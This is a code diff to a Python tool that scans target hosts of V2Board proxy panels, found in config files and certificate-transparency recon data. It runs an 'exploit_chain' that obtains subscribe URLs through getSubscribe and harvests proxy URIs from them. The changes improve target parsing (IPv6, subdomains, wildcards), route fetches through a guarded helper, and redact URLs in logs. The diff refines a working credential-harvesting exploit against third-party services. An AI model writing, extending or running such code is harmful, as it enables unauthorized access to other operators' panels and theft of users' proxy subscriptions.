@@ -55,6 +55,11 @@ from typing import Any
 import httpx
 import yaml
 
+try:
+    from .gray_sources import _redact_url, _safe_get_public_url
+except ImportError:  # direct script execution
+    from gray_sources import _redact_url, _safe_get_public_url
+
 ROOT = Path(__file__).resolve().parents[2]
 CONFIG_FILE = ROOT / "config" / "v2board_targets.yaml"
 STATE_DIR = ROOT / "state"
@@ -120,7 +125,10 @@ _TLS_PORTS = (443, 2053, 2083, 2087, 2096, 8443)
 def _base_url(host: str, port: int | None, scheme: str | None) -> str:
     if not scheme:
         scheme = "https" if (port or 443) in _TLS_PORTS else "http"
-    return f"{scheme}://{host}:{port}" if port else f"{scheme}://{host}"
+    rendered_host = f"[{host}]" if ":" in host and not host.startswith("[") else host
+    return (
+        f"{scheme}://{rendered_host}:{port}" if port else f"{scheme}://{rendered_host}"
+    )
 
 
 def _split_host_port(host_field: str, default_port: int = 443) -> tuple[str, int]:
@@ -258,16 +266,22 @@ def _load_recon_intel_hosts() -> list[str]:
                     rec = json.loads(line)
                 except Exception:  # noqa: BLE001
                     continue
+                # CT records carry the watched parent in `domain`; the actual
+                # endpoint identity is the SAN/subdomain (or SNI). Prefer it so
+                # multiple tenants under one parent are not collapsed.
                 h = (
-                    rec.get("host")
-                    or rec.get("domain")
+                    rec.get("subdomain")
                     or rec.get("sni")
+                    or rec.get("host")
+                    or rec.get("domain")
                     or rec.get("ip")
                 )
                 if not h:
                     continue
                 host, _ = _split_host_port(str(h))
-                host = host.strip()
+                host = host.strip().lower()
+                if host.startswith("*."):
+                    host = host[2:]
                 if host and host not in seen:
                     seen.add(host)
                     hosts.append(host)
@@ -388,10 +402,8 @@ async def _fetch_subscribe_uris(
     client: httpx.AsyncClient, subscribe_url: str, timeout: float = 15.0
 ) -> list[str]:
     """Fetch subscribe content, base64-decode if needed, regex out URIs."""
-    try:
-        r = await client.get(subscribe_url, timeout=timeout)
-    except Exception as e:  # noqa: BLE001
-        _log(f"  fetch subscribe content failed: {type(e).__name__}")
+    r = await _safe_get_public_url(client, subscribe_url, timeout=timeout)
+    if r is None:
         return []
     if r.status_code >= 400:
         _log(f"  subscribe content HTTP {r.status_code}")
@@ -527,7 +539,7 @@ async def exploit_chain(
         _log(f"  {host}: getSubscribe no subscribe_url — abort")
         return []
 
-    _log(f"  {host}: subscribe_url acquired -> {subscribe_url[:80]}")
+    _log(f"  {host}: subscribe_url acquired -> {_redact_url(subscribe_url)}")
     uris = await _fetch_subscribe_uris(client, subscribe_url, timeout)
     _log(f"  {host}: harvested {len(uris)} URIs")
     return uris
